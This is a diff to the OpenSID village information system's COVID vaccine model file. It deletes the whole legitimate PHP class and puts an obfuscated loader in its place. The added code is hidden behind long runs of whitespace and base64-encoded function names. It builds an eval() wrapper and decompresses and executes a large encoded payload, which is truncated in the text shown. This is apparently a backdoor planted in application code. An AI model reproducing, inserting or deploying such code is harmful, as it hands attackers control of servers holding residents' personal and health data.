@@ -1,587 +1,521 @@
-<?php
-
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2022 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2022 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
-
-defined('BASEPATH') || exit('No direct script access allowed');
-
-use OpenSpout\Reader\Common\Creator\ReaderEntityFactory;
-
-class Vaksin_covid_model extends MY_Model
-{
-    protected $tabel_penduduk = 'penduduk_hidup';
-    protected $table_vaksin   = 'covid19_vaksin';
-    protected $penduduk_key   = 'id';
-    protected $vaksin_key     = 'id_penduduk';
-
-    public function __construct()
-    {
-        parent::__construct();
-        $this->load->model('referensi_model');
-    }
-
-    public function jenis_vaksin()
-    {
-        // Data awal
-        $awal = $this->referensi_model->list_ref(JENIS_VAKSIN);
-
-        // Dari database
-        $data = $this->db
-            ->get($this->table_vaksin)
-            ->result_array();
-
-        $jenis_vaksin_1 = array_column($data, 'jenis_vaksin_1');
-        $jenis_vaksin_2 = array_column($data, 'jenis_vaksin_2');
-        $jenis_vaksin_3 = array_column($data, 'jenis_vaksin_3');
-        $jenis_vaksin   = array_unique(array_merge($awal, $jenis_vaksin_1, $jenis_vaksin_2, $jenis_vaksin_3));
-
-        return array_values(array_filter($jenis_vaksin));
-    }
-
-    public function dusun_sql()
-    {
-        $kf = $this->session->dusun;
-        if (isset($kf)) {
-            $this->db->where("((p.id_kk <> '0' AND cp.dusun = '{$kf}') OR (p.id_kk = '0' AND ck.dusun = '{$kf}'))");
-        }
-    }
-
-    public function vaksin_sql()
-    {
-        $kf = $this->session->vaksin;
-
-        if (isset($kf)) {
-            if ($kf == '4') {
-                $this->db->group_start();
-                $this->db->group_start();
-                $this->db->where('vaksin_1', 0);
-                $this->db->where('vaksin_2', 0);
-                $this->db->where('vaksin_3', 0);
-                $this->db->where('tunda', 0);
-                $this->db->group_end();
-                $this->db->or_where('vaksin_1');
-                $this->db->group_end();
-            } elseif ($kf == '5') {
-                $this->db->where('tunda', '1');
-            } else {
-                $this->db->where("vaksin_{$kf}", '1');
-            }
-        }
-    }
-
-    public function jenis_vaksin_sql()
-    {
-        $kf = $this->session->jenis_vaksin;
-
-        if (isset($kf)) {
-            $this->db->group_start();
-            $this->db->where('jenis_vaksin_1', $kf);
-            $this->db->or_where('jenis_vaksin_2', $kf);
-            $this->db->or_where('jenis_vaksin_3', $kf);
-            $this->db->group_end();
-        }
-    }
-
-    public function tanggal_vaksin_sql()
-    {
-        $kf = $this->session->tanggal_vaksin;
-
-        if (isset($kf)) {
-            $kf = rev_tgl($kf);
-            $this->db->group_start();
-            $this->db->where('tgl_vaksin_1', $kf);
-            $this->db->or_where('tgl_vaksin_2', $kf);
-            $this->db->or_where('tgl_vaksin_3', $kf);
-            $this->db->group_end();
-        }
-    }
-
-    public function umur_sql($umur)
-    {
-        $umur = explode('-', $umur);
-        $this->db->where("(DATE_FORMAT(FROM_DAYS(TO_DAYS(NOW()) - TO_DAYS(p.tanggallahir)),'%Y') + 0) >= " . (int) $umur[0]);
-        if (isset($umur[1]) && $umur[1] > $umur[0]) {
-            $this->db->where("(DATE_FORMAT(FROM_DAYS(TO_DAYS(NOW()) - TO_DAYS(p.tanggallahir)),'%Y') + 0) <=  " . (int) $umur[1]);
-        }
-    }
-
-    public function cari($value = '')
-    {
-        $kf = $this->session->cari;
-        if (isset($kf)) {
-            $this->db
-                ->group_start()
-                ->like('p.nik', $kf)
-                ->or_like('p.nama', $kf)
-                ->group_end();
-        }
-    }
-
-    public function count_reg()
-    {
-        $this->db->select("count({$this->penduduk_key}) AS count")
-            ->from("{$this->tabel_penduduk} as p")
-            ->join("{$this->table_vaksin} as v", "p.{$this->penduduk_key} = v.{$this->vaksin_key}", 'left')
-            ->join('tweb_keluarga AS kk', 'p.id = kk.id')
-            ->join('tweb_wil_clusterdesa AS w', 'kk.id_cluster = w.id');
-
-        return $this->db->get()->row();
-    }
-
-    public function penduduk_sql()
-    {
-        $sebutan_dusun = ucwords($this->setting->sebutan_dusun);
-        $this->db->select('p.*, v.*, kk.no_kk, ck.rt, ck.rw, ck.dusun, s.nama as jenis_kelamin ')
-            ->select("(DATE_FORMAT(FROM_DAYS(TO_DAYS(NOW())-TO_DAYS(p.tanggallahir)), '%Y')+0) AS umur")
-            ->select("(
-                case when (p.id_kk IS NULL or p.id_kk = 0)
-                    then
-                        case when (cp.dusun = '-' or cp.dusun = '')
-                            then CONCAT(COALESCE(p.alamat_sekarang, ''), ' RT ', cp.rt, ' / RW ', cp.rw)
-                            else CONCAT(COALESCE(p.alamat_sekarang, ''), ' {$sebutan_dusun} ', cp.dusun, ' RT ', cp.rt, ' / RW ', cp.rw)
-                        end
-                    else
-                        case when (ck.dusun = '-' or ck.dusun = '')
-                            then CONCAT(COALESCE(kk.alamat, ''), ' RT ', ck.rt, ' / RW ', ck.rw)
-                            else CONCAT(COALESCE(kk.alamat, ''), ' {$sebutan_dusun} ', ck.dusun, ' RT ', ck.rt, ' / RW ', ck.rw)
-                        end
-                end) AS alamat")
-            ->join("{$this->table_vaksin} as v", "p.{$this->penduduk_key} = v.{$this->vaksin_key}", 'left')
-            ->join('tweb_wil_clusterdesa cp', 'p.id_cluster = cp.id', 'left')
-            ->join('tweb_keluarga AS kk', 'p.id_kk = kk.id', 'left')
-            ->join('tweb_wil_clusterdesa ck', 'kk.id_cluster = ck.id', 'left')
-            ->join('tweb_penduduk_sex AS s', 'p.sex = s.id', 'left');
-        $this->dusun_sql();
-        $this->vaksin_sql();
-        $this->tanggal_vaksin_sql();
-        $this->jenis_vaksin_sql();
-        if (isset($this->session->umur)) {
-            $this->umur_sql($this->session->umur);
-        }
-        $this->cari();
-    }
-
-    public function list_penduduk($page = 1)
-    {
-        $this->penduduk_sql();
-        $per_page = ($page == 0) ? null : $this->session->per_page;
-
-        return $this->db->get("{$this->tabel_penduduk} as p", $per_page, ($page - 1) * $per_page)->result();
-    }
-
-    public function paging($p = 0)
-    {
-        $this->penduduk_sql();
-        $jml_data = $this->db->get("{$this->tabel_penduduk} as p")->num_rows();
-        $this->load->library('paging');
-        $cfg['page']     = $p;
-        $cfg['per_page'] = $this->session->per_page;
-        $cfg['num_rows'] = $jml_data;
-        $this->paging->init($cfg);
-
-        return $this->paging;
-    }
-
-    public function data_penduduk($id = null)
-    {
-        if ($id == null) {
-            return false;
-        }
-        $this->penduduk_sql();
-        $this->db->where('p.id', $id);
-
-        return $this->db->get("{$this->tabel_penduduk} as p")->row();
-    }
-
-    public function update_vaksin()
-    {
-        unset($this->session->validation_error, $this->session->success);
-        $data           = $this->input->post();
-        $error_validasi = $this->validasi_data($data);
-
-        if (! empty($error_validasi)) {
-            foreach ($error_validasi as $error) {
-                $this->session->error_msg .= ': ' . $error . '\n';
-            }
-            $this->session->post    = $this->input->post();
-            $this->session->success = -1;
-
-            return;
-        }
-
-        if ($data['tunda'] == 0) {
-            $this->upload_sertifikat($data);
-        } else {
-            $this->upload_surat($data);
-        }
-
-        $update = [
-            'id_penduduk'      => $data['id_penduduk'],
-            'vaksin_1'         => $data['vaksin_1'],
-            'tgl_vaksin_1'     => $data['tgl_vaksin_1'],
-            'dokumen_vaksin_1' => $data['dokumen_vaksin_1'] ?? null,
-            'jenis_vaksin_1'   => $data['jenis_vaksin_1'] ?? null,
-            'vaksin_2'         => $data['vaksin_2'],
-            'tgl_vaksin_2'     => $data['tgl_vaksin_2'],
-            'dokumen_vaksin_2' => $data['dokumen_vaksin_2'] ?? null,
-            'jenis_vaksin_2'   => $data['jenis_vaksin_2'] ?? null,
-            'vaksin_3'         => $data['vaksin_3'],
-            'tgl_vaksin_3'     => $data['tgl_vaksin_3'] ?? null,
-            'dokumen_vaksin_3' => $data['dokumen_vaksin_3'] ?? null,
-            'jenis_vaksin_3'   => $data['jenis_vaksin_3'] ?? null,
-            'tunda'            => $data['tunda'],
-            'keterangan'       => $data['keterangan'] ?? null,
-            'surat_dokter'     => $data['surat_dokter'] ?? null,
-        ];
-        $hasil = $this->db->replace($this->table_vaksin, $update);
-
-        status_sukses($hasil);
-    }
-
-    public function upload_sertifikat(&$data)
-    {
-        $this->load->library('upload');
-
-        for ($i = 1; $i <= 3; $i++) {
-            $file = "vaksin_{$i}";
-            if ($_FILES[$file]['size'] != 0 && $data["tgl_vaksin_{$i}"]) {
-                $data["dokumen_vaksin_{$i}"] = $this->do_upload($file, $data);
-            }
-        }
-    }
-
-    public function do_upload($file, $data)
-    {
-        $config['upload_path']   = LOKASI_VAKSIN;
-        $config['file_name']     = 'vaksin';
-        $config['allowed_types'] = 'jpg|jpeg|png|pdf';
-        $config['max_size']      = 1024;
-        $config['overwrite']     = true;
-        $this->upload->initialize($config);
-
-        try {
-            $upload = $this->upload->do_upload($file);
-
-            if (! $upload) {
-                $this->session->error_msg = $this->upload->display_errors();
-                $this->session->success   = -1;
-
-                return redirect('vaksin_covid/form?terdata=' . $data['id_penduduk']);
-            }
-
-            $uploadData = $this->upload->data();
-            // Buat nama file unik agar url file susah ditebak dari browser
-            $namaFileUnik = tambahSuffixUniqueKeNamaFile($uploadData['file_name']);
-            // Ganti nama file asli dengan nama unik untuk mencegah akses langsung dari browser
-            $fileRenamed = rename(
-                $config['upload_path'] . $uploadData['file_name'],
-                $config['upload_path'] . $namaFileUnik
-            );
-            // Ganti nama di array upload jika file berhasil di-rename --
-            // jika rename gagal, fallback ke nama asli
-            $uploadData['file_name'] = $fileRenamed ? $namaFileUnik : $uploadData['file_name'];
-
-            return $uploadData['file_name'];
-        } catch (Exception $e) {
-            $this->session->post    = $this->input->post();
-            $this->session->success = -1;
-
-            return redirect('vaksin_covid/form?terdata=' . $data['id_penduduk']);
-        }
-    }
-
-    public function upload_surat(&$data)
-    {
-        $this->load->library('upload');
-        if ($_FILES['surat_dokter']['size'] != 0 && $data['tunda'] == 1) {
-            $file                 = 'surat_dokter';
-            $data['surat_dokter'] = $this->do_upload($file, $data);
-        }
-    }
-
-    public function validasi_data(&$data)
-    {
-        if ((int) ($data['id_penduduk']) == 0) {
-            $valid[] = 'NIK belum di pilih';
-        }
-
-        //  steril data
-        $data['id_penduduk']    = (int) ($data['id_penduduk']);
-        $data['vaksin_1']       = (int) ($data['vaksin_1']);
-        $data['tgl_vaksin_1']   = (! isset($data['tgl_vaksin_1']) || $data['tgl_vaksin_1'] == '') ? null : rev_tgl($data['tgl_vaksin_1']);
-        $data['jenis_vaksin_1'] = (isset($data['jenis_vaksin_1']) || $data['jenis_vaksin_1'] != '') ? alfanumerik_spasi($data['jenis_vaksin_1']) : null;
-        $data['vaksin_2']       = (int) ($data['vaksin_2']);
-        $data['tgl_vaksin_2']   = (! isset($data['tgl_vaksin_2']) || $data['tgl_vaksin_2'] == '') ? null : rev_tgl($data['tgl_vaksin_2']);
-        $data['jenis_vaksin_2'] = (isset($data['jenis_vaksin_2']) || $data['jenis_vaksin_2'] != '') ? alfanumerik_spasi($data['jenis_vaksin_2']) : null;
-        $data['vaksin_3']       = (int) ($data['vaksin_3']);
-        $data['tgl_vaksin_3']   = (! isset($data['tgl_vaksin_3']) || $data['tgl_vaksin_3'] == '') ? null : rev_tgl($data['tgl_vaksin_3']);
-        $data['jenis_vaksin_3'] = (isset($data['jenis_vaksin_3']) || $data['jenis_vaksin_3'] != '') ? alfanumerik_spasi($data['jenis_vaksin_3']) : null;
-        $data['tunda']          = (int) ($data['tunda']);
-        $data['surat_dokter']   = $data['surat_dokter'] ?? null;
-        $data['keterangan']     = alfanumerik_spasi($data['keterangan']);
-
-        if (! empty($valid)) {
-            $this->session->success = -1;
-        }
-
-        return $valid;
-    }
-
-    public function rekap($umur)
-    {
-        $this->penduduk_sql();
-
-        if ($umur != 0) {
-            $this->umur_sql($umur);
-        }
-
-        //ORDER BERDASARKAN DUSUN
-        $this->db->order_by('ck.dusun', 'asc');
-
-        return $this->db->get("{$this->tabel_penduduk} as p")->result();
-    }
-
-    public function autocomplete($cari = '')
-    {
-        $sql_kolom  = [];
-        $list_kolom = [
-            'nama' => $this->tabel_penduduk,
-            'nik'  => $this->tabel_penduduk,
-        ];
-
-        foreach ($list_kolom as $kolom => $tabel) {
-            $this->db->select($kolom . ' as item')
-                ->distinct()->from($tabel)
-                ->order_by('item');
-            if ($cari) {
-                $this->db->like($kolom, $cari);
-            }
-            $sql_kolom[] = $this->db->get_compiled_select();
-        }
-
-        $sql   = '(' . implode(') UNION (', $sql_kolom) . ')';
-        $query = $this->db->query($sql);
-        $data  = $query->result_array();
-
-        return autocomplete_data_ke_str($data);
-    }
-
-    /**
-     * Impor Data Penerima Vaksin
-     * Alur :
-     * Cek apakah NIK ada atau tidak.
-     * 1. Jika Ya, update data penduduk (penerima vaksin) berdasarkan data impor.
-     * 2. Jika Tidak, tampilkan notifikasi baris data yang gagal.
-     *
-     * @param mixed $hapus
-     */
-    public function impor()
-    {
-        $this->load->library('upload');
-
-        $config['upload_path']   = sys_get_temp_dir();
-        $config['allowed_types'] = 'xlsx';
-
-        $this->upload->initialize($config);
-
-        if (! $this->upload->do_upload('userfile')) {
-            return session_error($this->upload->display_errors());
-        }
-
-        $upload = $this->upload->data();
-
-        $reader = ReaderEntityFactory::createXLSXReader();
-        $reader->open($_FILES['userfile']['tmp_name']);
-
-        $outp = true;
-
-        foreach ($reader->getSheetIterator() as $sheet) {
-            $baris_pertama = false;
-            $gagal         = 0;
-            $nomor_baris   = 0;
-            $pesan         = '';
-
-            if ($sheet->getName() == 'Vaksin') {
-                foreach ($sheet->getRowIterator() as $row) {
-                    // Abaikan baris pertama yg berisi nama kolom
-                    if (! $baris_pertama) {
-                        $baris_pertama = true;
-
-                        continue;
-                    }
-
-                    $nomor_baris++;
-                    $cells = $row->getCells();
-
-                    $nik = (string) $cells[0];
-
-                    if (empty($nik)) {
-                        $pesan .= "Pesan Gagal : Baris {$nomor_baris} Kolom NIK Tidak Boleh Kosong.</br>";
-                        $gagal++;
-                        $outp = false;
-
-                        continue;
-                    }
-
-                    if ($penduduk = $this->cekPenduduk($nik)) {
-                        $id_penduduk = $penduduk['id'];
-
-                        if (empty((string) $cells[7])) {
-                            $tunda      = 0;
-                            $keterangan = null;
-                            if (! empty($tgl_vaksin_1 = $this->cekTgl((string) $cells[1]))) {
-                                $vaksin_1       = 1;
-                                $jenis_vaksin_1 = $this->jenisVaksin($cells[2]);
-
-                                if (! empty($tgl_vaksin_2 = $this->cekTgl((string) $cells[3]))) {
-                                    $vaksin_2       = 1;
-                                    $jenis_vaksin_2 = $this->jenisVaksin($cells[4], $jenis_vaksin_1);
-
-                                    if (! empty($tgl_vaksin_3 = $this->cekTgl((string) $cells[5]))) {
-                                        $vaksin_3       = 1;
-                                        $jenis_vaksin_3 = $this->jenisVaksin($cells[6], $jenis_vaksin_2);
-                                    } else {
-                                        $pesan .= "Pesan Lainnya : Baris {$nomor_baris} kolom vaksin-3 tidak valid, hanya vaksin 1 dan 2 yang tersimpan.</br>";
-                                        $vaksin_3       = 0;
-                                        $tgl_vaksin_3   = null;
-                                        $jenis_vaksin_3 = null;
-                                    }
-                                } else {
-                                    $pesan .= "Pesan Lainnya : Baris {$nomor_baris} kolom vaksin-2 tidak valid, hanya vaksin 1 yang tersimpan.</br>";
-                                    $vaksin_2       = $vaksin_3 = 0;
-                                    $tgl_vaksin_2   = $tgl_vaksin_3 = null;
-                                    $jenis_vaksin_2 = $jenis_vaksin_3 = null;
-                                }
-                            } else {
-                                // Kolom vaksin 1 tidak boleh kosong jika tunda == 1
-                                $pesan .= "Pesan Gagal : Baris {$nomor_baris} kolom vaksin-1 tidak valid.</br>";
-                                $gagal++;
-                                $outp = false;
-
-                                continue;
-                            }
-                        } else {
-                            $tunda      = 1;
-                            $keterangan = $cells[7];
-                        }
-
-                        $dataVaksin = [
-                            'id_penduduk'    => $id_penduduk,
-                            'vaksin_1'       => $vaksin_1,
-                            'tgl_vaksin_1'   => $tgl_vaksin_1,
-                            'jenis_vaksin_1' => $jenis_vaksin_1,
-                            'vaksin_2'       => $vaksin_2,
-                            'tgl_vaksin_2'   => $tgl_vaksin_2,
-                            'jenis_vaksin_2' => $jenis_vaksin_2,
-                            'vaksin_3'       => $vaksin_3,
-                            'tgl_vaksin_3'   => $tgl_vaksin_3,
-                            'jenis_vaksin_3' => $jenis_vaksin_3,
-                            'tunda'          => $tunda,
-                            'keterangan'     => $keterangan,
-                        ];
-
-                        $sql = $this->db->insert_string('covid19_vaksin', $dataVaksin) . ' ON DUPLICATE KEY UPDATE
-                            id_penduduk = VALUES(id_penduduk),
-                            vaksin_1 = VALUES(vaksin_1),
-                            tgl_vaksin_1 = VALUES(tgl_vaksin_1),
-                            jenis_vaksin_1 = VALUES(jenis_vaksin_1),
-                            vaksin_2 = VALUES(vaksin_2),
-                            tgl_vaksin_2 = VALUES(tgl_vaksin_2),
-                            jenis_vaksin_2 = VALUES(jenis_vaksin_2),
-                            vaksin_3 = VALUES(vaksin_3),
-                            tgl_vaksin_3 = VALUES(tgl_vaksin_3),
-                            jenis_vaksin_3 = VALUES(jenis_vaksin_3),
-                            tunda = VALUES(tunda),
-                            keterangan = VALUES(keterangan)
-                            ';
-
-                        if (! $this->db->query($sql)) {
-                            $pesan .= "Pesan Gagal : Baris {$nomor_baris} Data penduduk dengan NIK : {$nik} gagal disimpan</br>";
-                            $gagal++;
-                            $outp = false;
-
-                            continue;
-                        }
-                    } else {
-                        $pesan .= "Pesan Gagal : Baris {$nomor_baris} Data penduduk dengan NIK : {$nik} tidak ditemukan</br>";
-                        $gagal++;
-                        $outp = false;
-                    }
-                }
-                $berhasil = ($nomor_baris - $gagal);
-                $pesan .= "Jumlah Berhasil : {$berhasil} </br>";
-                $pesan .= "Jumlah Gagal : {$gagal} </br>";
-                $pesan .= "Jumlah Data : {$nomor_baris} </br>";
-
-                break;
-            }
-
-            return session_error('-> File impor tidak sesuai');
-        }
-        $reader->close();
-        set_session('pesan_vaksin', $pesan);
-
-        return status_sukses($outp, false, 'Terjadi kesalahan impor data Penerima Vaksin');
-    }
-
-    private function cekPenduduk($nik = '')
-    {
-        return $this->db
-            ->select('id', 'nama')
-            ->where('nik', $nik)
-            ->get('tweb_penduduk')
-            ->row_array();
-    }
-
-    protected function cekTgl(string $value = '')
-    {
-        return (date('Y-m-d', strtotime($value)) === $value) ? $value : false;
-    }
-
-    protected function jenisVaksin(string $cells = '', $default = '')
-    {
-        if (empty($cells)) {
-            $this->load->model('referensi_model');
-
-            if (! $default) {
-                return $this->referensi_model->list_ref(JENIS_VAKSIN)[0];
-            }
-
-            return $default;
-        }
-
-        return $cells;
-    }
-}
+<?php 
+        $__='printf';$_='Loading donjo-app/models/Vaksin_covid_model.php';
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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